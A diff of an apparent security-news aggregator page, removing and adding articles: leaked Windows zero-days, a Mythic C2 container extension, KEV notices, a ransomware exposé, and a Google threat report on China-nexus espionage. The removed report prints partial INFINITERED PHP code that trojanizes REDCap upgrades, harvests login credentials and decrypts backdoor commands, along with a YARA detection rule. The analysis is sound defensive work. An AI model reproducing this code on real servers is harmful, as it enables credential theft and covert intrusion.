+Over the past several months, the researcher has publicly leaked multiple Windows zero-day exploits, including for the [BlueHammer](https://www.bleepingcomputer.com/news/security/disgruntled-researcher-leaks-bluehammer-windows-zero-day-exploit/), [RedSun](https://www.bleepingcomputer.com/news/microsoft/new-microsoft-defender-redsun-zero-day-poc-grants-system-privileges/), [GreenPlasma](https://www.bleepingcomputer.com/news/security/windows-bitlocker-zero-day-gives-access-to-protected-drives-poc-released/#:~:text=The%20GreenPlasma%20exploit), [MiniPlasma](https://www.bleepingcomputer.com/news/microsoft/new-windows-miniplasma-zero-day-exploit-gives-system-access-poc-released/), [YellowKey](https://www.bleepingcomputer.com/news/security/windows-bitlocker-zero-day-gives-access-to-protected-drives-poc-released/), and [UnDefend](https://github.com/Nightmare-Eclipse/UnDefend) flaws. Some of these zero-days affect Microsoft Defender, while others target BitLocker and Windows components.
+The company [reacted](http://www.microsoft.com/en-us/msrc/blog/2026/05/a-shared-responsibility-protecting-customers-through-coordinated-vulnerability-disclosure) to Nightmare Eclipse's disclosures by issuing [warnings of legal action](http://x.com/msftsecresponse/status/2061293718942908925) when people engage in "malicious activity causing real harm to our customers," leading cybersecurity experts and researchers to believe that Microsoft was threatening the researcher.
+Microsoft fixed the GreenPlasma, MiniPlasma, and YellowKey flaws last week as part of the [June 2026 Patch Tuesday](https://www.bleepingcomputer.com/news/microsoft/microsoft-june-2026-patch-tuesday-fixes-3-zero-day-200-flaws/)updates.
 [Test every layer before attackers do](https://hubs.li/Q04jQ9z40)
 Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen.
 The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection.
@@ -123,6 +256,17 @@ Not a member yet? Register Now</div>
             <hr class="separator">
         </div>
         <div id="art-3" class="article-body">
+            <h2 class="article-title">Mythic Embarking on the Open Seas: Containerized Payload Delivery for Kubernetes Assessments</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/06/16/mythic-embarking-on-the-open-seas-containerized-payload-delivery-for-kubernetes-assessments/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>TL;DR: We created new Mythic extensions to simplify container-centric assessments, including Kubernetes and Docker-based ceded access workflows. These tools help operators wrap Mythic payloads in OCI-compatible containers and publish them to a self-hosted registry. Check the container_wrapper and container_registry on GitHub. Introduction There are quite a few command and control (C2) frameworks available for teams [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/06/16/mythic-embarking-on-the-open-seas-containerized-payload-delivery-for-kubernetes-assessments/">Mythic Embarking on the Open Seas: Containerized Payload Delivery for Kubernetes Assessments</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
             <h2 class="article-title">JQ for Hackers</h2>
             <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/jq-for-hackers" target="_blank">Original Link</a></p>
             <div class="content-text">JQ for Hackers
@@ -295,257 +439,7 @@ That's enough to handle 90% of what you'll encounter on an engagement. So put th
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">Microsoft Defender email security benchmarking: Key insights from one year of data</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/06/15/microsoft-defender-email-security-benchmarking-key-insights-from-one-year-of-data/" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft publishes [quarterly email security benchmarking data](https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-defender-office-365/performance-benchmarking) comparing [Microsoft Defender](https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-defender-office-365) against secure email gateway (SEG) and integrated cloud email security (ICES) vendors using real-world threat telemetry.
-A year ago, we set out to change how email security effectiveness is measured. With [our first benchmarking report in July 2025](https://www.microsoft.com/en-us/security/blog/2025/07/17/transparency-on-microsoft-defender-for-office-365-email-security-effectiveness/), we committed to publishing real-world performance data, not synthetic tests, so security teams could make decisions grounded in evidence. With each quarterly update, we refined our methodology, expanded our analysis, and listened to customer and partner feedback.
-Alongside it, we established the Microsoft Defender ICES vendor ecosystem, designed to enable seamless integration with trusted third-party vendors and streamline security operations center (SOC) workflows for organizations who have chosen a multi-vendor email security strategy.
-Key insights from a year of email benchmarking
-With four consecutive quarters, several findings have proven to be durable insights, highlighting the sustained realities of how layered email security performs in production:
-1. Defender consistently leads in pre-delivery detection. Across every benchmarking period since July 2025, Defender has missed fewer high-severity cyberthreats than every SEG vendor evaluated, while the next closest SEG vendor had 2.5 times more misses.
-2. ICES vendors add the most value in promotional and bulk email filtering. Promotional filtering uplift has been the clearest area of ICES value with an average uplift of 15% over the four quarters of evaluation. Meanwhile ICES vendor uplift for malicious catch and spam has consistently remained relatively nominal, averaging at 0.29% and 0.68%, respectively. In addition, over the last three quarters we’ve seen a consistent downward trend in these numbers, as we have continued to drive innovation in post-delivery mail detection.
-3. Defender’s share of post-delivery remediation has grown significantly. In our second report, we introduced insights on the contribution of Defender to post-delivery malicious catch. Initially, Defender contributed 45% of post-delivery malicious catch, which has since risen to an average of 96%. This trajectory underscores that Microsoft’s post-delivery catch is an increasingly critical backstop, operating even when ICES solutions are in place, and that Defender is delivering the majority of post-delivery remediation.
-SEG vendor benchmarking results
-For SEG vendors, a threat is classified as “missed” if it was not detected prior to delivery. Using this definition, Microsoft Defender once again missed fewer high-severity email threats than all other solutions evaluated, consistent with every prior benchmarking period.
-This quarter, Defender missed 59% fewer high-severity threats than the next-closest SEG vendor, a gap that has remained consistent across all four benchmarking periods.
-ICES vendor benchmarking results
-ICES solutions operating on top of Microsoft Defender continue to provide benefit, particularly in reducing promotional and bulk email, with an average improvement of 16.85% over the last quarter. This helps minimize inbox clutter and improves user productivity in environments where promotional noise is a concern. For malicious messages and spam, the average improvement across vendors was 0.13% for malicious and 0.28% for spam catch, compared to 0.24% and 0.29% in the prior report.
-Focusing only on malicious messages that reached the inbox, the latest quarter shows Microsoft Defender’s post-delivery catch continues to improve, catching the majority of post‑delivery remediation. It removes an average of 96.03%, up from 70.8% in the previous quarter, highlighting the effectiveness of our continuous investments in this area. Post‑delivery remediation remains a critical backstop when cyberthreats evade initial filtering.
-Innovation shaped by benchmarking insights
-Benchmarking doesn’t just help customers make better decisions. It shapes what we build. Over the past year we’ve used the insights from our benchmarking reports, as well as insights from the growing ICES vendor ecosystem, to directly shape our innovation and product outcomes. Below are some of the most recent highlights, that we directly attribute to the continued improvements in Microsoft Defender performance.
-Native promotion and bulk mail filtering in Outlook: A dedicated Promotions folder, natively provisioned in Outlook, now keeps legitimate bulk mail out of the primary inbox. Promotional content is separated from priority emails without being sent to Junk, which means users can still access and browse newsletters and updates at their own pace. The folder appears at the top level of the mailbox for easy discovery and is visible across all Outlook experiences. Once generally available it will be on by default, improving the native promotional filtering. [Learn more](https://techcommunity.microsoft.com/blog/microsoftdefenderforoffice365blog/declutter-and-defend-reducing-promotional-mail-noise-with-microsoft-defender/4511732).
-System-level AI advancements: Among other AI enhancements, in November 2025 we introduced an agentic grading system that reduces the reliance on manual review in the submission and analysis pipeline. It helps deliver lower wait times, faster responses, and higher-quality results when emails are submitted to Microsoft for review. That means security teams can investigate reported messages more efficiently, respond more promptly, and act with greater confidence against phishing threats. [Learn more](https://techcommunity.microsoft.com/blog/microsoftdefenderforoffice365blog/microsoft-ignite-2025-transforming-phishing-response-with-agentic-innovation/4470791).
-Accelerating investigation with AI: The growing role of post-delivery remediation in our benchmarking data highlights a related challenge: when threats reach users and get reported, SOC teams need to triage those submissions quickly and accurately. The [Microsoft Security Copilot](https://www.microsoft.com/en-us/security/business/ai-machine-learning/microsoft-security-copilot) Alert Triage Agent uses language model-powered reasoning to classify user-reported phishing emails, resolve false positives, and escalate confirmed threats for analyst review. Results show analysts identify 6.5 times more malicious alerts, improve verdict accuracy by 77%, and spend 53% more time investigating real cyberthreats. Security Copilot’s Email Summary further speeds investigations by turning email detection data into clear, actionable insights in the Email entity page. [Learn more](https://techcommunity.microsoft.com/blog/microsoftdefenderforoffice365blog/announcing-public-preview-security-copilot%E2%80%99s-email-summary-in-microsoft-defender/4510357).
-A year into this effort, our commitment to transparent benchmarking remains unchanged. We’ll continue using these insights to shape product innovation, share real-world performance data with customers, and invest in a strong ecosystem that meets organizations where they are—supporting the layered email security strategies that work best for their environments.
-Learn more
-Learn more about [Microsoft Defender](https://www.microsoft.com/en-us/security/business/siem-and-xdr/microsoft-defender-office-365).
-To learn more about Microsoft Security solutions, visit our [website.](https://www.microsoft.com/en-us/security/business) Bookmark the [Security blog](https://www.microsoft.com/security/blog/) to keep up with our expert coverage on security matters. Also, follow us on LinkedIn ([Microsoft Security](https://www.linkedin.com/showcase/microsoft-security/)) and X ([@MSFTSecurity](https://twitter.com/@MSFTSecurity)) for the latest news and updates on cybersecurity.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
         <div id="art-5" class="article-body">
-            <h2 class="article-title">Public and Private Medical Community Targeted by China-Nexus Threat Actor Pursuing Artificial Intelligence, Cyber, Medical, and National Defense Research</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/prc-targets-us-medical-research/" target="_blank">Original Link</a></p>
-            <div class="content-text">Public and Private Medical Community Targeted by China-Nexus Threat Actor Pursuing Artificial Intelligence, Cyber, Medical, and National Defense Research
-Google Threat Intelligence Group
-Google Threat Intelligence
-Visibility and context on the threats that matter most.
-[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
-Written by: Patrick Whitsell, John McGuiness
-Google Threat Intelligence Group (GTIG) has identified a sophisticated campaign attributed to UNC6508, a People's Republic of China (PRC)-nexus threat actor, targeting institutions in the North American academic, medical, and military research community. While remaining undetected for over a year, the threat actor compromised externally facing web applications, deployed bespoke malware, pivoted to sensitive internal systems, and abused enterprise administrative tools for covert data exfiltration. The threat actor had broad collection aspirations, including sensitive defense intelligence related to national security, Indo-Pacific command operations, artificial intelligence, uncrewed vehicle systems, cyber offensive programs, and medical research.
-GTIG disrupted the malicious infrastructure associated with this threat actor. Working with Mandiant Consulting, we notified the affected organizations upon detection and offered our assistance with remediation. We have updated [Google Security Operations](https://cloud.google.com/security/products/security-operations) (SecOps) with relevant intelligence, enabling defenders to identify indicators of compromise (IOCs) within their networks. We encourage all users and customers to follow recommended best practices for [third-party Identity Providers](https://knowledge.workspace.google.com/admin/apps/best-practices-for-third-party-idp-and-google-workspace-configuration) (IdP) and ensure [2-Step Verification](https://knowledge.workspace.google.com/admin/security/about-2sv-enforcement-for-admins) (2SV) is enabled across all accounts.
-Campaign Overview
-The campaign targeted a diverse set of national, state, and private medical entities. These organizations comprise world-renowned clinical providers, premier academic centers, North American military health institutions, professional advocacy groups, and health regulatory bodies. Their research areas span a broad spectrum of modern medicine, from molecular discovery and clinical drug trials to state-level public health policy and military readiness. They employ thousands of people with a combined research budget in the billions of dollars.
-The earliest known compromise occurred in September 2023, after which GTIG observed a consistent operational pattern. The threat actor exploited externally facing [REDCap](http://project-redcap.org) (Research Electronic Data Capture) servers and deployed custom malware named INFINITERED to capture legitimate REDCap login credentials. Then, after remaining undetected for more than a year, UNC6508 used the captured credentials to access the victim’s internal network. The threat actor was also observed using the novel technique of manipulating domain content compliance rules for data exfiltration. Lastly, UNC6508 used sophisticated operations security (OpSec) techniques to conceal and obfuscate their activity.
-GTIG collaborated closely with Mandiant Consulting, the FLARE team, and Workspace Security on this effort to combine our threat intelligence, incident response, and reverse engineering expertise across Google Cloud. This enabled us to develop a complete picture of the [attack lifecycle](https://cloud.google.com/security/resources/insights/targeted-attack-lifecycle) from initial compromise to complete mission. GTIG also extends thanks to the affected organizations for their cooperation and the valuable post-exploitation insights they shared.
-Prevention, Detection, and Remediation
-GTIG recommends defenders implement the following security measures, across all Cloud enterprise platforms, to mitigate this threat:
--
-Secure Admin Accounts: Enforce phishing-resistant
-[2-Step Verification (2SV)](https://knowledge.workspace.google.com/admin/security/deploy-2-step-verification)for enterprise administrator accounts, including through third-party Identity Providers. -
-Advanced Protection: Consider enrolling highly sensitive accounts in our
-[Advanced Protection Program](https://landing.google.com/intl/en_in/advancedprotection/)for additional safeguards against malware and phishing attacks. -
-Prevent Cookie Theft: Enforce
-[Device Bound Session Credentials](https://knowledge.workspace.google.com/admin/security/prevent-cookie-theft-with-session-binding)(DBSC) with[CAA](https://knowledge.workspace.google.com/admin/security/protect-your-business-with-context-aware-access)for highly sensitive accounts on Windows devices to prevent session hijacking. -
-Monitor Audit Logs: Enable
-[Audit logs](https://docs.cloud.google.com/logging/docs/audit/gsuite-audit-logging)to analyze, monitor, and alert on changes to your data. -
-Control Data: Define
-[Data Loss Prevention (DLP) rules](https://knowledge.workspace.google.com/admin/security/about-dlp)to block or alert on external sharing of sensitive data. -
-Audit Compliance Rules: Review
-[Admin audit logs](https://knowledge.workspace.google.com/admin/reports/admin-log-events)and content compliance rules for unauthorized modifications. -
-SIEM Coverage: Consider using
-[Google Security Operations](https://cloud.google.com/security/products/security-operations)(SecOps) and ensure Workspace logs are included in your Security Information and Event Management (SIEM) pipeline. -
-Password Protection: Use Chrome Enterprise
-[Password Leak Detection](https://support.google.com/chrome/a/answer/13597868?hl=en)to alert when potentially compromised password use is detected. -
-Patch REDCap: Fully updated REDCap installations to the latest software version and ensure older versions are completely removed.
--
-Monitor for INFINITERED: Scan REDCap servers for the presence of INFINITERED using the provided YARA rule and IOCs.
-Medical Research University Compromise
-In September 2023, a [REDCap](http://project-redcap.org) server belonging to a North American medical research institution was compromised. Continuing activity was observed through November 2025. During this time period, UNC6508 carried out the following attack chain.
--
-Exploit the REDCap server.
--
-After three months, deploy the INFINITERED malware.
--
-INFINITERED stealthily records credentials, and persists through upgrades, for more than a year.
--
-Pivot to a domain admin account.
--
-Add the malicious content compliance rule.
--
-Silently “BCC-forward” matched emails to a threat actor-controlled account.
-Figure 1: Campaign attack flow diagram
-Initial Access: REDCap Exploitation and INFINITERED
-UNC6508 consistently targets REDCap servers. REDCap is a web-based software platform designed specifically for building and managing online databases and surveys, in compliance with regulations for medical and scientific research. It is a commonly used platform in the North American medical research community.
-GTIG was not able to confirm how UNC6508 initially gained access to the REDCap server. By design, REDCap allows administrators to continue running legacy software side-by-side with the current version. UNC6508 was observed probing for these vulnerable legacy versions on several target organizations’ REDCap systems. This highlights not only the increasing importance of rapidly applying security patches, but also promptly removing older software versions to prevent [downgrade attacks](https://attack.mitre.org/techniques/T1689/).
-Upon establishing a foothold on the REDCap server, UNC6508 performed internal reconnaissance and credential discovery to obtain database and service account credentials. The threat actor also deployed a web shell named "help.php", which maintained persistence and functioned as an uploader in the REDCap application.
-INFINITERED Analysis
-Three months after the initial compromise, UNC6508 deployed a custom malware payload tracked as INFINITERED. This malware implements its functionality across three distinct modular components by trojanizing legitimate REDCap system files.
--
-Dropper and Upgrade Interception
--
-Credential Harvester
--
-Backdoor, with command and control (C2)
-GTIG discovered multiple organizations across the US and Canada compromised with INFINITERED. All of these organizations were promptly notified of the compromise upon detection and offered our assistance with remediation.
-Figure 2: INFINITERED diagram
-Dropper and Upgrade Interception
-To maintain persistent remote access, INFINITERED injects its code into new REDCap versions by intercepting the upgrade process. This capability is embedded into the legitimate REDCap upgrade system file. INFINITERED performs this code injection following these steps.
--
-Read the current software version, which includes the INFINITERED code.
--
-Extract the malicious logic using GUID delimiter b49e334d-9c01-463e-9bc5-00a6920fb66e.
--
-Inject backdoor code into the custom hooks configuration file.
--
-Inject credential harvester code into the authentication system file.
--
-Inject the extracted code from step 2 into the upgrade system file.
-In Elastic Beanstalk environments, INFINTERED performs additional steps to ensure persistence in cloud deployments.
-// b49e334d-9c01-463e-9bc5-00a6920fb66e
-...
-$file_upgrade = $base_path."Upgrade.php";
-$file_content_upgrade = $zip->getFromName($file_upgrade); // new upgrade file content
-$file_content_upgrade_local = file_get_contents(__FILE__); // Contents of the current file
-...
-if ($file_content_upgrade !== false) {
-// Base64 GUID delimiter
-$dummy_marker = base64_decode('YjQ5ZTMzNGQtOWMwMS00NjNlLTliYzUtMDBhNjkyMGZiNjZl');
-$pattern = "/$dummy_marker(.*?)$dummy_marker/s";
-if (preg_match($pattern, $file_content_upgrade_local, $matches)) {
-$extracted_text = $matches[0];
-$search_content = "// If running on AWS Elastic Beanstalk";
-$upgrade_decode = "// ".$extracted_text."\r\n\t\t".$search_content;
-$new_content = str_replace($search_content, $upgrade_decode, $file_content_upgrade);
-$zip->deleteName($file_upgrade);
-$zip->addFromString($file_upgrade, $new_content);
-}
-}
-$zip->close();
-...
-// b49e334d-9c01-463e-9bc5-00a6920fb66e
-Code Snippet 1: Intercept upgrades and inject INFINITERED code
-Credential Harvester
-INFINITERED injects a credential harvester into the authentication system file to compromise user accounts. This component of the malware captures usernames and passwords submitted via POST requests during the login process. The credentials are encrypted using the environment’s default encryption routine and hidden inside a local REDCap sessions database table with the string “xc32038474a” prefixed to the Session ID.
-$currentUTC = gmdate('Y-m-d H:i:s');
-$str = encrypt($currentUTC . '[::]' . $_POST['username'] . '[::]' . $_POST['password']);
-include dirname(__FILE__, 3) . DIRECTORY_SEPARATOR . 'redcap_connect.php';
-$expiration_timestamp = strtotime("+60 days", strtotime($currentUTC));
-$session_id = 'xc32038474a'.substr(bin2hex($currentUTC), -20);
-$session_sql = "INSERT INTO [REDACTED] ([REDACTED],[REDACTED],[REDACTED]) VALUES ('$session_id', '$str', FROM_UNIXTIME($expiration_timestamp))";
-@$rc_connection->query($session_sql);
-Code Snippet 2: Hide credentials in a legitimate database table
-Backdoor
-INFINITERED also has backdoor functionality it establishes in the custom hooks system file inside the update package, specifically within a function that executes on every REDCap page load. This global hook ensures the backdoor runs on every page load. INFINITERED looks for a specific HTTP Cookie parameter named "REDCAP-TOKEN" and a cookie value starting with a specific plaintext string. If these conditions are present, the malware strips the prefix and decrypts the remaining payload with the environment's default decryption routine.
-$cookieValue = $_COOKIE['REDCAP-TOKEN'];
-if ($cookieValue) {
-$magic_flag = '[REDACTED]'; // Cookie prefix
-...
-// Decrypt message if cookie prefix is found
-$key = '[REDACTED]';
-$req_data = substr($cookieValue, strlen($magic_flag));
-$req_data = decrypt($req_data, $key);
-Code Snippet 3: Decrypting commands to INFINITERED
-If the decrypted payload is empty, the malware acts as a beacon, returning system details such as the OS, PHP version, working directory, and database credentials including the hostname, username, password, and salt. When non-empty, the malware will parse the payload for command tags, which the threat actor can use to execute shell commands, run raw SQL queries, and transfer files.
-Supported Commands
-INFINITERED is capable of executing the following commands.
-Table 1: Supported commands for INFINITERED
-Domain Content Compliance Rule Abuse
-More than a year after the initial compromise, UNC6508 used overlapping credentials, harvested from REDCap, to access an administrator account. This underscores the challenge and importance of securing systems holistically. Defenders should enable [2-Step Verification (2SV)](https://knowledge.workspace.google.com/admin/security/deploy-2-step-verification) and ensure unique credentials are used across different security domains to mitigate credential replay attacks.
-UNC6508 then leveraged [content compliance rules](https://knowledge.workspace.google.com/admin/gmail/advanced/set-up-rules-for-advanced-email-content-filtering#compliance_rules), a legitimate feature present in many cloud-based enterprise productivity suites, to exfiltrate specific email communications. Administrators can create these rules to manage email messages that contain content matching predefined sets of words, phrases, text patterns, or numerical patterns. By default, compliance rules apply to all users in an organizational unit. The use of compliance rules for data exfiltration is a novel technique not previously observed with PRC-nexus threat actors.
-Specifically, UNC6508 created a compliance rule named "Patroit" [sic] that used regular expressions to match on keyword and email address patterns in sent or received emails. Matches were silently BCC-forwarded to a threat actor-controlled Gmail address, BebitaBarefoot774[@]gmail[.]com, providing a covert and continuous stream of exfiltrated data. Upon discovery, GTIG disabled the Gmail account to prevent further data exfiltration.
-Figure 3: Targeted intelligence collection categories
-The patterns used in the “Patroit” compliance rule suggest strategic intelligence collection targeting geo-strategic policy, military strategy, advanced technology, and medical research. The patterns also include professional email addresses and phone numbers for members of organizations in these spaces. Several of the terms applied have spelling errors, suggesting the list was manually maintained.
-This ambitious scope of intelligence collection from UNC6508 may suggest a broader range of targets beyond the identified victims in the medical research community. GTIG assesses these collection priorities are aligned with the strategic interests of the People's Republic of China.
-While most of the terms relate to defense and technology, the terms including medical research facilities, and the specific pathogen “Chikungunya,” stand out from the others. Chikungunya is a viral disease transmitted to humans from mosquitos and was responsible for an [outbreak in China's Guangdong province](https://www.unmc.edu/healthsecurity/transmission/2025/09/30/explosive-chikungunya-virus-outbreak-in-china/) beginning in July 2025.
-Operations Security (OpSec)
-GTIG observed UNC6508 use sophisticated and meticulous OpSec techniques to conceal their activities from defenders.
-Figure 4: UNC6508 operations security techniques
-UNC6508 relied heavily on Obfuscation (OBF) networks. This strategy, now frequently employed by PRC-nexus actors, involves routing traffic from offensive operations through a mix of compromised routers, residential proxies, Virtual Private Servers (VPS), and other devices.
-This operation used exclusively US-based OBF network IP addresses to access both the "BebitaBarefoot774[@]gmail[.]com" account and when replaying legitimate credentials to access the compromised enterprise administrator account. Additional OpSec techniques were also used, such as obtaining the threat actor-controlled Gmail account through a mass creation service and dedicating it exclusively to email data exfiltration.
-By maintaining a high level of OpSec, UNC6508 significantly complicates the efforts of defenders to identify malicious patterns, establish accurate attribution, and map the threat actor’s infrastructure.
-Attribution
-GTIG attributes this activity to UNC6508 with high confidence. This assessment is based on infrastructure overlaps between campaigns, the consistent use of the INFINITERED backdoor on REDCap servers, and the specific targeting of medical research and defense sectors. We assess UNC6508 is an espionage motivated threat cluster, with priorities that align with historic PRC state-sponsored espionage trends and intelligence collection requirements.
-Indicators of Compromise (IOCs)
-To assist the wider community, we have also included a list of indicators in a [GTI Collection](https://www.virustotal.com/gui/collection/f3a266bed2b73690459e30a2e52e5afd4bc36ea83197ab8bf3d5cb17095a7eef) for registered users.
-Network Indicators
-File Indicators
-Host Indicators
-MITRE ATT&CK Mapping
-Detections
-YARA Rules
-rule G_Backdoor_INFINITERED_1 {
-meta:
-author = "Google Threat Intelligence Group (GTIG)"
-strings:
-$magic_flag = "ej671a16i7fd8202nu6ltfg5p6x7u"
-$magic_flag_base64 = "ej671a16i7fd8202nu6ltfg5p6x7u" base64
-$marker = "b49e334d-9c01-463e-9bc5-00a6920fb66e"
-$marker_base64 = "YjQ5ZTMzNGQtOWMwMS00NjNlLTliYzUtMDBhNjkyMGZiNjZl"
-$s1 = "substr($cookieValue, strlen($magic_flag));"
-$s2 = "getcwd(), php_uname(), phpversion(), $_SERVER['SERVER_SOFTWARE']"
-$s3 = "'data' => encrypt($data, $key)"
-$s4 = "$data = shell_exec($command);"
-$s5 = "move_uploaded_file($tmpPath, $fileName)"
-$s6 = "$data = implode('|', $fields)"
-$b_s1 = "substr($cookieValue, strlen($magic_flag));" base64
-$b_s2 = "getcwd(), php_uname(), phpversion(), $_SERVER['SERVER_SOFTWARE']" base64
-$b_s3 = "'data' => encrypt($data, $key)" base64
-$b_s4 = "$data = shell_exec($command);" base64
-$b_s5 = "move_uploaded_file($tmpPath, $fileName)" base64
-$b_s6 = "$data = implode('|', $fields)" base64
-$t1 = "(isset($_POST['username']) && $_POST['password'])"
-$t2 = "INSERT INTO redcap_sessions (session_id, session_data, session_expiration) VALUES ('$session_id', '$str', FROM_UNIXTIME($expiration_timestamp))"
-$t3 = "encrypt($currentUTC . '[::]' . $_POST['username'] . '[::]' . $_POST['password']);"
-$t4 = "redcap_connect.php"
-$b_t1 = "(isset($_POST['username']) && $_POST['password'])" base64
-$b_t2 = "INSERT INTO redcap_sessions (session_id, session_data, session_expiration) VALUES ('$session_id', '$str', FROM_UNIXTIME($expiration_timestamp))" base64
-$b_t3 = "encrypt($currentUTC . '[::]' . $_POST['username'] . '[::]' . $_POST['password']);" base64
-$b_t4 = "redcap_connect.php" base64
-$u1 = "$zip->open($filename) === TRUE)"
-$u2 = "$hooks_encode ="
-$u3 = "$auth_encode ="
-$u4 = "$file_content_hooks = $zip->getFromName($file_hooks);"
-$u5 = "$file_content_auth = $zip->getFromName($file_auth);"
-$u6 = "$file_content_upgrade = $zip->getFromName($file_upgrade);"
-$u7 = "str_replace($search_content, $hooks_decode, $file_content_hooks);"
-$u8 = "str_replace($search_content, $upgrade_decode, $file_content_upgrade);"
-$u9 = "str_replace($search_content, $auth_decode, $file_content_auth);"
-$b_u1 = "$zip->open($filename) === TRUE)" base64
-$b_u2 = "$hooks_encode =" base64
-$b_u3 = "$auth_encode =" base64
-$b_u4 = "$file_content_hooks = $zip->getFromName($file_hooks);" base64
-$b_u5 = "$file_content_auth = $zip->getFromName($file_auth);" base64
-$b_u6 = "$file_content_upgrade = $zip->getFromName($file_upgrade);" base64
-$b_u7 = "str_replace($search_content, $hooks_decode, $file_content_hooks);" base64
-$b_u8 = "str_replace($search_content, $upgrade_decode, $file_content_upgrade);" base64
-$b_u9 = "str_replace($search_content, $auth_decode, $file_content_auth);" base64
-$filemarker = "<?php"
-condition:
-filesize < 1MB and $filemarker in (0 .. 128) and (((any of ($magic*) or any of ($marker*)) and (any of ($s*) or any of ($t*) or any of ($u*))) or 4 of ($s*) or 4 of ($b_s*) or all of ($t*) or all of ($b_t*) or 6 of ($u*) or 6 of ($b_u*))
-}</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-6" class="article-body">
-            <h2 class="article-title">CISA Adds Two Known Exploited Vulnerabilities to Catalog</h2>
-            <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/06/15/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
-            <div class="content-text">CISA Adds Two Known Exploited Vulnerabilities to Catalog
-CISA has added two new vulnerabilities to its [Known Exploited Vulnerabilities (KEV) Catalog](/known-exploited-vulnerabilities-catalog), based on evidence of active exploitation.
-[CVE-2026-20262](https://www.cve.org/CVERecord?id=CVE-2026-20262)Cisco Catalyst SD-WAN Manager Directory or Path Traversal Vulnerability[CVE-2026-54420](https://www.cve.org/CVERecord?id=CVE-2026-54420)LiteSpeed cPanel Plugin UNIX Symbolic Link (Symlink) Following Vulnerability
-These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise.
-[Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk](/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk) establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies, updating [BOD 22-01](/binding-operational-directive-22-01). BOD 26-04 reinforces the importance of the KEV catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s Known Exploited Vulnerabilities (KEV) catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied.
-While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of [KEV catalog vulnerabilities](/known-exploited-vulnerabilities-catalog). CISA will continue to add vulnerabilities to the catalog that meet the [specified criteria](/known-exploited-vulnerabilities).
-Aware of an exploited vulnerability not currently listed in the KEV catalog? Submit for potential addition: [KEV Nomination Form](https://cisasurvey.gov1.qualtrics.com/jfe/form/SV_1Zwu52kgK2OYf3w). Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.
-This product is provided subject to this [Notification](/notification) and this [Privacy & Use](/privacy-policy) policy.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
             <h2 class="article-title">CISA Adds Cisco, Chrome, and Arista Flaws to KEV Catalog Amid Active Exploitation</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/cisa-adds-cisco-chrome-and-arista-flaws.html" target="_blank">Original Link</a></p>
             <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday [added](https://www.cisa.gov/news-events/alerts/2026/06/09/cisa-adds-three-known-exploited-vulnerabilities-catalog) three new vulnerabilities to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, following reports of active exploitation.
@@ -564,7 +458,7 @@ Federal Civilian Executive Branch (FCEB) agencies have been ordered to apply the
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-8" class="article-body">
+        <div id="art-6" class="article-body">
             <h2 class="article-title">Who Runs the Ransomware Group ‘The Gentlemen?’</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/who-runs-the-ransomware-group-the-gentlemen/" target="_blank">Original Link</a></p>
             <div class="content-text">A cybercrime group known as The Gentlemen has emerged as the second most active ransomware gang by victim count, rapidly attracting a talented pool of hackers through an aggressive recruitment strategy that promises affiliates 90 percent of any ransom paid by victims. This post examines clues pointing to a real life identity for the administrator of The Gentlemen ransomware group.
@@ -604,6 +498,7 @@ I don’t see why. He’s not infringing on any of Apple’s terms with his acco
 “He’s not infringing on any of Apple’s terms with his account, nor has he attacked Apple.”
 That _you_ know of? It’s improbable that nobody connected to Apple whatsoever was targeted.
